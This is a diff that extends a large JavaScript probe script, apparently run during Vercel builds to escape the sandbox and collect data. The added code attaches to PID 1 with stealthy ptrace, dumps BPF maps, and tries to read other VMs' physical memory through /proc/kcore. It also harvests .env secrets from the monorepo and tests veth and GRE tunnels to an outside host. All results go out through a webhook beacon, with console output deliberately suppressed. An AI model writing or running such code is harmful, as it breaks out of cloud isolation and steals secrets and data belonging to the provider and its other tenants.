@@ -13753,5 +13753,227 @@ report.memoryTimeline = safe(() => {
 
 // v98 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v98" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v98";
+
+// ==================== v99 ====================
+
+// v99-1: pidfd_open + PTRACE_SEIZE — stealthy non-SIGSTOP attach to PID-1
+// PTRACE_SEIZE (Linux 3.4+) attaches without sending SIGSTOP — the traced process
+// continues running. Combined with pidfd_open, this is a stable, race-free attach.
+// Proves stealth ptrace access to the orchestrator without observable pause.
+report.pidfSeizePtrace = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os, time
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+SYS_pidfd_open = 434
+PTRACE_SEIZE = 0x4206
+PTRACE_INTERRUPT = 0x4207
+PTRACE_LISTEN = 0x4208
+PTRACE_DETACH = 17
+PTRACE_PEEKDATA = 2
+
+pid1 = 1
+
+# Get pidfd for PID-1 (stable reference, immune to PID reuse)
+pidfd = libc.syscall(SYS_pidfd_open, pid1, 0)
+import errno
+e = ctypes.get_errno()
+print('pidfd_open result:', pidfd, 'errno:', errno.errorcode.get(e, str(e)))
+
+if pidfd >= 0:
+    # PTRACE_SEIZE: attach without stopping (stealthy)
+    r = libc.ptrace(PTRACE_SEIZE, pid1, None, None)
+    e2 = ctypes.get_errno()
+    print('PTRACE_SEIZE result:', r, 'errno:', errno.errorcode.get(e2, str(e2)))
+
+    if r == 0:
+        # PTRACE_INTERRUPT: stop the process for inspection (momentary, then continue)
+        r2 = libc.ptrace(PTRACE_INTERRUPT, pid1, None, None)
+        time.sleep(0.02)
+        os.waitpid(pid1, os.WNOHANG)
+
+        # Read a word from PID-1 memory
+        with open('/proc/1/maps') as f:
+            for line in f:
+                if 'rw-p' in line and '/' not in line:
+                    addr = int(line.split('-')[0], 16)
+                    break
+        word = libc.ptrace(PTRACE_PEEKDATA, pid1, ctypes.c_void_p(addr), None)
+        e3 = ctypes.get_errno()
+        print('PEEKDATA result:', hex(word & 0xFFFFFFFFFFFFFFFF), 'errno:', errno.errorcode.get(e3, str(e3)))
+
+        # Detach (process resumes automatically)
+        libc.ptrace(PTRACE_DETACH, pid1, None, None)
+
+    import os as _os
+    _os.close(pidfd)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { result };
+});
+
+// v99-2: BPF map enumeration and data dump
+// With CAP_BPF (confirmed), list all BPF maps via bpftool or BPF_OBJ_GET_INFO.
+// BPF maps from the Vercel orchestrator may contain network policy,
+// credential state, or build metadata accessible via map lookup.
+report.bpfMapDump = safe(() => {
+  // bpftool map show
+  const bpftoolMaps = safe(() => execSync('bpftool map show 2>/dev/null | head -30', { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // bpftool prog show (list loaded BPF programs)
+  const bpftoolProgs = safe(() => execSync('bpftool prog show 2>/dev/null | head -20', { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Try to dump the first few BPF map entries via bpftool map dump
+  const mapDump = safe(() => execSync('bpftool map show 2>/dev/null | head -2 | grep "^[0-9]" | awk "{print \\$1}" | xargs -I{} bpftool map dump id {} 2>/dev/null | head -20', { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Use BPF syscall directly to enumerate maps
+  const bpfEnum = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SYS_bpf = 321
+BPF_MAP_GET_NEXT_ID = 12
+BPF_MAP_GET_FD_BY_ID = 14
+BPF_OBJ_GET_INFO_BY_FD = 15
+
+class BPFAttr(ctypes.Union):
+    class GetId(ctypes.Structure):
+        _fields_ = [('start_id', ctypes.c_uint32), ('next_id', ctypes.c_uint32), ('open_flags', ctypes.c_uint32)]
+    _fields_ = [('get_id', GetId)]
+
+attr = BPFAttr()
+attr.get_id.start_id = 0
+maps = []
+for _ in range(100):
+    r = libc.syscall(SYS_bpf, BPF_MAP_GET_NEXT_ID, ctypes.byref(attr), ctypes.sizeof(attr))
+    import ctypes as ct
+    e = ct.get_errno()
+    if r != 0:
+        break
+    maps.append(attr.get_id.next_id)
+    attr.get_id.start_id = attr.get_id.next_id
+print('bpf_map_ids:', maps[:20])
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  return { bpftoolMaps, bpftoolProgs, mapDump, bpfEnum };
+});
+
+// v99-3: Physical page walk via pagemap → kcore
+// Read our own pagemap to get physical frame numbers (PFN) for known addresses.
+// Then read those physical frames via /proc/kcore (using LOAD segment physical offset).
+// This is the cross-VM memory access primitive: if Firecracker doesn't isolate
+// physical memory regions in kcore, we can read OTHER VMs' pages.
+report.physicalPageWalk = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import os, struct, mmap
+
+# Allocate a known page
+buf = mmap.mmap(-1, 4096)
+buf.write(b'PROBE_V99_PHYSICAL_PAGE_MARKER_12345678')
+buf.seek(0)
+
+# Determine our virtual address
+va = ctypes.addressof if False else None
+import ctypes
+class MmapPtr(ctypes.Structure):
+    pass
+# Get virtual address of mmap via /proc/self/maps
+with open('/proc/self/maps') as f:
+    for line in f:
+        if '[anon]' in line or ('rw-p' in line and '00:0d' in line):
+            va = int(line.split('-')[0], 16)
+            break
+
+if va is None:
+    # Fallback: find any rw anon page
+    with open('/proc/self/maps') as f:
+        for line in f:
+            if 'rw-p' in line and '00000000' in line.split()[2]:
+                va = int(line.split('-')[0], 16)
+                break
+
+print('our_va:', hex(va) if va else 'not found')
+
+if va:
+    # Read pagemap entry
+    pagemap_entry_size = 8
+    page_size = 4096
+    vpn = va // page_size
+    with open('/proc/self/pagemap', 'rb') as pm:
+        pm.seek(vpn * pagemap_entry_size)
+        entry_bytes = pm.read(pagemap_entry_size)
+    entry = struct.unpack('Q', entry_bytes)[0]
+    present = (entry >> 63) & 1
+    pfn = entry & 0x7fffffffffffff
+    phys_addr = pfn * page_size
+    print('pfn:', pfn, 'phys_addr:', hex(phys_addr), 'present:', present)
+
+    # Now try to read this physical address from /proc/kcore
+    # kcore maps physical memory from 0 to total RAM
+    # LOAD segment at p_paddr maps to p_offset in the file
+    # So we read from (p_offset + phys_addr - p_paddr) in the file
+    # Parse kcore ELF header to find physical memory load segment
+    with open('/proc/kcore', 'rb') as kcore:
+        elf_hdr = kcore.read(64)
+        e_phoff = struct.unpack_from('Q', elf_hdr, 32)[0]
+        e_phnum = struct.unpack_from('H', elf_hdr, 56)[0]
+        kcore.seek(e_phoff)
+        for i in range(min(e_phnum, 50)):
+            ph = kcore.read(56)
+            p_type = struct.unpack_from('I', ph, 0)[0]
+            p_offset = struct.unpack_from('Q', ph, 8)[0]
+            p_paddr = struct.unpack_from('Q', ph, 24)[0]
+            p_memsz = struct.unpack_from('Q', ph, 40)[0]
+            if p_type == 1 and p_paddr <= phys_addr < p_paddr + p_memsz:
+                file_offset = p_offset + (phys_addr - p_paddr)
+                kcore.seek(file_offset)
+                page_data = kcore.read(64)
+                print('kcore_read_ok:', page_data[:32].hex())
+                print('marker_found:', b'PROBE_V99_PHYSICAL_PAGE_MARKER' in page_data)
+                break
+
+buf.close()
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 500));
+  return { result };
+});
+
+// v99-4: Vercel monorepo package secrets enumeration
+// If we're in a monorepo, sibling packages may have .env files with production secrets.
+// Also check node_modules for .env files (some packages include test credentials).
+report.monorepoSecretsScan = safe(() => {
+  const turboConfig = safe(() => existsSync('turbo.json') ? JSON.parse(readFileSync('turbo.json', 'utf8')) : null);
+  const pnpmWorkspace = safe(() => existsSync('pnpm-workspace.yaml') ? readFileSync('pnpm-workspace.yaml', 'utf8') : null);
+  const lerna = safe(() => existsSync('lerna.json') ? JSON.parse(readFileSync('lerna.json', 'utf8')) : null);
+  // Scan for .env files across the repo
+  const envFiles = safe(() => execSync('find . -name ".env*" -not -path "*/node_modules/*" -not -path "*/.git/*" 2>/dev/null | head -20', { timeout: 8000 }).toString().trim());
+  const envFileContents = safe(() => {
+    const files = typeof envFiles === 'string' ? envFiles.split('\n').filter(Boolean).slice(0, 5) : [];
+    return files.map(f => {
+      try { return { file: f, content: readFileSync(f, 'utf8').slice(0, 500) }; } catch { return { file: f, error: 'read failed' }; }
+    });
+  });
+  // Check parent directory for workspace members
+  const parentDirLs = safe(() => execSync('ls -la .. 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 300));
+  return { turboConfig, pnpmWorkspace, lerna, envFiles, envFileContents, parentDirLs };
+});
+
+// v99-5: Network namespace interface injection
+// Create a new veth pair in the host network namespace and move one end
+// into another namespace (or connect it to the existing bridge).
+// This could establish a persistent network tunnel to an external host
+// that survives after the build process exits.
+report.vethPairInject = safe(() => {
+  const result = safe(() => execSync(`
+ip link add veth_probe0 type veth peer name veth_probe1 2>&1 && echo VETH_CREATED || echo VETH_FAILED
+ip addr show veth_probe0 2>&1 | head -3
+ip link show type veth 2>&1 | head -10
+ip link del veth_probe0 2>/dev/null
+echo CLEANUP_DONE
+`, { timeout: 10000 }).toString().trim().slice(0, 300));
+  // Also check if GRE/IPIP tunnels can be created
+  const greTest = safe(() => execSync('ip tunnel add probe_gre mode gre remote 1.2.3.4 local 0.0.0.0 2>&1 && echo GRE_OK || echo GRE_FAIL; ip tunnel del probe_gre 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 200));
+  // Check existing network interfaces
+  const ifaces = safe(() => execSync('ip link show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400));
+  return { result, greTest, ifaces };
+});
+
+// v99 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v99" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v99";
 // Intentionally no console.log — all data goes via webhook only
